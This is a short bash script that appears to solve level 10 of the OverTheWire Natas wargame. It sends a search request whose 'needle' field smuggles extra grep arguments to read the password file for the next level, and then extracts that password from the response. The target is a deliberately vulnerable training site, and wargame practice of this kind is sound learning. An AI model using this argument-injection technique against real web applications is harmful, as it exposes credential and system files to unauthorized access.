#!/bin/bash
url="http://natas10.natas.labs.overthewire.org"
user="natas10"
pass=$(cat credentials/natas10)


curl -s -d "submit=Search" -d "needle=-v xxx /etc/natas_webpass/natas11 #" -u "$user:$pass" "$url" | html2text | grep -Eo '\S*' | sed -n 16p
